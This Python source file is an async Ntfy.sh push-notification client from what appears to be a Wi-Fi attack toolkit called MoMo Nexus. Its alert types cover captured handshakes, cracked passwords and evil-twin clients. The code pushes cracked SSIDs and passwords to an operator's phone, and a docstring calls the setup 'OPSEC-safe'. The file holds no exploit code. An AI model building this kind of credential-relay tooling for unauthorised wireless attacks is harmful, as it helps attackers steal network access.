"""
Ntfy.sh Push Notification Client.

Sends push notifications via Ntfy.sh (self-hosted or public).
OPSEC-safe: self-hostable, zero metadata, simple HTTP API.

Usage:
    client = NtfyClient(NtfyConfig(
        server_url="https://ntfy.your-server.com",
        topic="momo-alerts",
        access_token="tk_your_token"  # Optional
    ))
    await client.send("Password cracked!", title="🔓 Success", priority="high")
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any

import aiohttp

logger = logging.getLogger(__name__)


class NtfyPriority(str, Enum):
    """Ntfy priority levels."""

    MAX = "max"      # 5 - Really long vibration
    HIGH = "high"    # 4 - Long vibration
    DEFAULT = "default"  # 3 - Short vibration
    LOW = "low"      # 2 - No vibration
    MIN = "min"      # 1 - No vibration, no sound


@dataclass
class NtfyConfig:
    """Ntfy client configuration."""

    # Server settings
    enabled: bool = False
    server_url: str = "https://ntfy.sh"  # Public server or self-hosted
    topic: str = "momo-alerts"

    # Authentication (optional)
    access_token: str | None = None  # Bearer token
    username: str | None = None      # Basic auth
    password: str | None = None

    # Default settings
    default_priority: NtfyPriority = NtfyPriority.DEFAULT
    default_tags: list[str] = field(default_factory=lambda: ["momo"])

    # Rate limiting
    min_interval_seconds: int = 5  # Minimum time between notifications

    # Filtering
    min_severity: str = "medium"  # Only send alerts >= this severity

    @property
    def topic_url(self) -> str:
        """Get full topic URL."""
        return f"{self.server_url.rstrip('/')}/{self.topic}"


@dataclass
class NotificationResult:
    """Result of a notification send attempt."""

    success: bool
    message_id: str | None = None
    error: str | None = None
    timestamp: datetime = field(default_factory=datetime.now)


class NtfyClient:
    """
    Ntfy.sh push notification client.

    Features:
    - Async HTTP client
    - Rate limiting
    - Priority mapping
    - Emoji tag support
    - Click actions
    - File attachments (URLs)
    """

    # Map severity to priority
    SEVERITY_PRIORITY_MAP = {
        "critical": NtfyPriority.MAX,
        "high": NtfyPriority.HIGH,
        "medium": NtfyPriority.DEFAULT,
        "low": NtfyPriority.LOW,
        "info": NtfyPriority.MIN,
    }

    # Map alert types to emoji tags
    ALERT_EMOJI_MAP = {
        "handshake_captured": "handshake",
        "password_cracked": "key",
        "credential_captured": "lock",
        "device_offline": "warning",
        "device_lost": "skull",
        "device_low_battery": "battery",
        "channel_down": "x",
        "evil_twin_client": "smiling_imp",
        "system_error": "rotating_light",
    }

    def __init__(self, config: NtfyConfig) -> None:
        self.config = config
        self._session: aiohttp.ClientSession | None = None
        self._last_send: datetime | None = None
        self._lock = asyncio.Lock()

    async def _get_session(self) -> aiohttp.ClientSession:
        """Get or create HTTP session."""
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession()
        return self._session

    async def close(self) -> None:
        """Close HTTP session."""
        if self._session and not self._session.closed:
            await self._session.close()

    def _build_headers(self) -> dict[str, str]:
        """Build request headers with authentication."""
        headers: dict[str, str] = {}

        if self.config.access_token:
            headers["Authorization"] = f"Bearer {self.config.access_token}"
        elif self.config.username and self.config.password:
            import base64
            credentials = f"{self.config.username}:{self.config.password}"
            encoded = base64.b64encode(credentials.encode()).decode()
            headers["Authorization"] = f"Basic {encoded}"

        return headers

    async def send(
        self,
        message: str,
        title: str | None = None,
        priority: NtfyPriority | str | None = None,
        tags: list[str] | None = None,
        click_url: str | None = None,
        attach_url: str | None = None,
        actions: list[dict[str, str]] | None = None,
    ) -> NotificationResult:
        """
        Send a push notification.

        Args:
            message: Notification body text
            title: Notification title
            priority: Priority level (max, high, default, low, min)
            tags: Emoji tags (e.g., ["warning", "skull"])
            click_url: URL to open when notification is clicked
            attach_url: URL of file to attach
            actions: Action buttons

        Returns:
            NotificationResult with success status

        Example:
            await client.send(
                message="CORP-WiFi cracked: Summer2025!",
                title="🔓 Password Cracked",
                priority="high",
                tags=["key", "tada"],
                click_url="https://nexus.local/captures"
            )
        """
        if not self.config.enabled:
            return NotificationResult(success=False, error="Notifications disabled")

        # Rate limiting
        async with self._lock:
            if self._last_send:
                elapsed = (datetime.now() - self._last_send).total_seconds()
                if elapsed < self.config.min_interval_seconds:
                    wait_time = self.config.min_interval_seconds - elapsed
                    await asyncio.sleep(wait_time)
            self._last_send = datetime.now()

        # Resolve priority
        if isinstance(priority, str):
            try:
                priority = NtfyPriority(priority)
            except ValueError:
                priority = self.config.default_priority
        elif priority is None:
            priority = self.config.default_priority

        # Build headers
        headers = self._build_headers()
        headers["Content-Type"] = "text/plain"

        if title:
            headers["Title"] = title
        headers["Priority"] = priority.value

        # Tags (combine default + custom)
        all_tags = list(self.config.default_tags)
        if tags:
            all_tags.extend(tags)
        if all_tags:
            headers["Tags"] = ",".join(all_tags)

        if click_url:
            headers["Click"] = click_url

        if attach_url:
            headers["Attach"] = attach_url

        # Actions (e.g., view, http, broadcast)
        if actions:
            import json
            headers["Actions"] = json.dumps(actions)

        try:
            session = await self._get_session()
            async with session.post(
                self.config.topic_url,
                headers=headers,
                data=message.encode("utf-8"),
                timeout=aiohttp.ClientTimeout(total=10),
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    logger.info(f"Notification sent: {title or message[:50]}")
                    return NotificationResult(
                        success=True,
                        message_id=result.get("id"),
                    )
                else:
                    error_text = await response.text()
                    logger.error(f"Ntfy error {response.status}: {error_text}")
                    return NotificationResult(
                        success=False,
                        error=f"HTTP {response.status}: {error_text}",
                    )

        except TimeoutError:
            logger.error("Ntfy request timeout")
            return NotificationResult(success=False, error="Request timeout")
        except aiohttp.ClientError as e:
            logger.error(f"Ntfy client error: {e}")
            return NotificationResult(success=False, error=str(e))
        except Exception as e:
            logger.error(f"Ntfy unexpected error: {e}")
            return NotificationResult(success=False, error=str(e))

    async def send_alert(
        self,
        alert_type: str,
        severity: str,
        title: str,
        message: str,
        device_id: str | None = None,
        data: dict[str, Any] | None = None,
    ) -> NotificationResult:
        """
        Send an alert as push notification.

        Maps alert severity to priority and adds appropriate emoji.

        Args:
            alert_type: Type of alert (handshake_captured, password_cracked, etc.)
            severity: Severity level (critical, high, medium, low, info)
            title: Alert title
            message: Alert message
            device_id: Source device ID
            data: Additional alert data

        Returns:
            NotificationResult
        """
        # Check minimum severity
        severity_order = ["info", "low", "medium", "high", "critical"]
        min_idx = severity_order.index(self.config.min_severity)
        current_idx = severity_order.index(severity) if severity in severity_order else 2

        if current_idx < min_idx:
            return NotificationResult(
                success=False,
                error=f"Severity {severity} below minimum {self.config.min_severity}"
            )

        # Map to priority
        priority = self.SEVERITY_PRIORITY_MAP.get(severity, NtfyPriority.DEFAULT)

        # Build tags with emoji
        tags = []
        emoji = self.ALERT_EMOJI_MAP.get(alert_type)
        if emoji:
            tags.append(emoji)

        # Add severity emoji
        severity_emoji = {
            "critical": "rotating_light",
            "high": "warning",
            "medium": "information_source",
            "low": "speech_balloon",
        }
        if severity in severity_emoji and severity_emoji[severity] not in tags:
            tags.append(severity_emoji[severity])

        # Build message with device info
        full_message = message
        if device_id:
            full_message = f"[{device_id}] {message}"

        # Add key data to message
        if data:
            if "ssid" in data:
                full_message += f"\nSSID: {data['ssid']}"
            if "password" in data:
                full_message += f"\nPassword: {data['password']}"
            if "bssid" in data:
                full_message += f"\nBSSID: {data['bssid']}"

        return await self.send(
            message=full_message,
            title=title,
            priority=priority,
            tags=tags,
        )

    async def test(self) -> NotificationResult:
        """
        Send a test notification.

        Returns:
            NotificationResult
        """
        return await self.send(
            message="If you see this, Ntfy integration is working!",
            title="🧪 MoMo Nexus Test",
            priority=NtfyPriority.DEFAULT,
            tags=["white_check_mark", "momo"],
        )

